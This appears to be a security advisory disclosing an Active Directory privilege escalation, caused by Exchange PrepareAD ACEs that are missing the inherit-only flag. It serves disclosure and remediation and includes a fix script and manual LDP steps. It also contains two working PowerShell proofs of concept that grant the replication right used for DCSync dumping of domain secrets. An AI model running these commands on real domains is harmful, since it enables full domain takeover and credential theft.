</head><body><b>Domain object DACL privilege escalation </b><br/>
A privilege escalation is possible from the <b>Exchange Windows permissions</b>&nbsp;(EWP) security group to compromise the entire prepared Active Directory domain.<br/>
&nbsp;<br/>
DISCLAIMER: This issue has been responsibly disclosed to MSRC in October 2017 and after a few back and forth emails, they decided it was working as intended and would not fix it.<br/>
&nbsp;<ul><li>&nbsp;Description of the issue</li>
</ul>
<br/>
When preparing Exchange 2010/2013/2016 installation in Shared permissions (default) or RBAC split permissions, some ACEs are positioned on the domain object for the <b>Exchange Windows Permissions</b>&nbsp;security group. This happens during the "Setup /PrepareAD" command.<br/>
&nbsp;<br/>
Two ACEs on the domain object are missing the INHERIT_ONLY_ACE bit in the Flags field.<br/>
&nbsp;<br/>
This is their SDDL representation:<br/>
(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;&lt;SID of EWP&gt;) (OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;&lt;SID of EWP&gt;) &nbsp;<br/>
<br/>
Notice the missing 'IO' (inherit_only) flag. As a matter of fact, INHERITED_OBJECT_TYPE ACE effectively apply to the object itself when the inherit_only flag is not set.<br/>
&nbsp;<br/>
This is how they are documented on Technet, so it is definitely missing that information:<br/>
<br/>
Account &#09;&#09;&#09;&#09;&#09;&#09;ACE type &#09;&#09;Inheritance &#09;Permissions &#09;On property/ Applies to &#09;Comments &nbsp; &nbsp; <br/>
Exchange Windows Permissions &#09;Allow ACE &#09;All &#09;&#09;&#09;WriteDACL &#09;/ user &nbsp; &nbsp;<br/>
Exchange Windows Permissions &#09;Allow ACE &#09;All &#09;&#09;&#09;WriteDACL &#09;/ inetOrgPerson &nbsp; &nbsp; <br/>
<br/>
The issue can be confirmed in the "Effective Access" tab of the domain object when specifying EWP. &nbsp;<br/>
<br/>
<br/>
Coincidentally, INHERITED_OBJECT_TYPE ACE created with DSA console always have the IO flag. Creating a 'self and specific descendents', INHERITED_OBJECT_TYPE ACE is only possible programmatically and only viewable programmatically.<br/>
<b><br/>
<br/>
<br/>
</b><b>Technical consequence</b><br/>
The Allow permission to WriteDACL is granted to the Trustee on the domain object itself and not only on its user/inetOrgPerson descendants, effectively giving complete control to anyone with the <b>Exchange Windows Permissions</b>&nbsp;SID in its token.<br/>
&nbsp;<br/>
<br/>
<b>Expected behavior</b><br/>
The Allow permission to WriteDACL should only be given on child objects matching the INHERITED_OBJECT_TYPE Guid. It is supposed to only apply to user or inetOrgPerson classes. This is not consistent with the other INHERITED_OBJECT_TYPE ACEs on the domain object for the same Trustee, which all have the INHERIT_ONLY_ACE bit in the Flags field.<br/>
<br/>
<br/>
<b>Security Consequence</b><br/>
A privilege escalation is possible from the <b>Exchange Windows permissions</b>&nbsp;(EWP) security group to compromise the entire prepared Active Directory domain. Just set the Ds-Replication-Get-Changes-All extended right on the domain object. This is enough to use a DRSUAPI replication tool ala DCSync to get all the domain secrets (Kerberos keys, hashes, etc.).<br/>
&nbsp;<br/>
You can control the SID of the EWP group from <b>Organization management</b>, from <b>Account operators</b>&nbsp;or from any Exchange server. Interestingly, the RBAC system is proxified through EWP so a privilege escalation is possible from the <i>Active Directory Permissions</i>&nbsp;RBAC role to compromise the entire prepared Active Directory domain.<br/>
&nbsp;<br/>
<br/>
<br/>
<b>Proof of concept 1: Set-Acl (or with DSA console)</b><br/>
From an <b>Organization Management</b>&nbsp;member account, add yourself to <b>Exchange Windows Permissions</b>. This is possible by default (see the above technet page).<br/>
<br/>
$id = [Security.Principal.WindowsIdentity]::GetCurrent()<br/>
$user = Get-ADUser -Identity $id.User <br/>
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user<br/>
<br/>
RELOG to update groups in your token then give yourself Ds-Replication-Get-Changes-All extended right on the domain object.<br/>
<br/>
$acl = get-acl "ad:DC=test,DC=local"<br/>
$id = [Security.Principal.WindowsIdentity]::GetCurrent()<br/>
$user = Get-ADUser -Identity $id.User<br/>
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID<br/>
<br/>
# rightsGuid for the extended right Ds-Replication-Get-Changes-All<br/>
$objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 $identity = [System.Security.Principal.IdentityReference] $sid<br/>
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight" $type = [System.Security.AccessControl.AccessControlType] "Allow"<br/>
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"<br/>
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType<br/>
$acl.AddAccessRule($ace) Set-acl -aclobject $acl "ad:DC=test,DC=com" &nbsp;<br/>
<br/>
<br/>
<br/>
<b>Proof of concept 2: RBAC Add-ADPermission</b><br/>
The following Powershell code, executed by a user account with the RBAC role <i>Active Directory Permissions</i>, sets the Ds-Replication-Get-Changes-All extended right on the domain object.<br/>
<br/>
$id = [Security.Principal.WindowsIdentity]::GetCurrent() Add-ADPermission "DC=test,DC=local" -User $id.Name -ExtendedRights Ds-Replication-Get-Changes-All<br/>
<br/>
<br/>
<b>Workaround fix</b><br/>
Use the Fix-DomainObjectDACL.ps1 Powershell script in this repository. Read it, test it, use it at your own risk.<br/>
&nbsp;<br/>
By default, it checks the two faulty ACE, this can be done by any user. Use with -Fix switch with Domain Admins privileges to set the InheritOnly missing flags. Use with -Restore switch to restore the two previously fixed ACEs to their original, <i>vulnerable</i>&nbsp;state. An SDDL backup is made everytime the script is run.<br/>
&nbsp;<br/>
Another option is doing it manually with LDP. Bind as a Domain Admin account with the usual precautions, as you will change the domain object DACL. Locate the 2 faulty ACE in the DACL of the domain object: you can sort by Trustee to see Exchange Windows Permissions, there will only be 2 ACE with "Write DACL,..." Rights. Check the 'Inherit only' box in their ACE flags field.<br/>
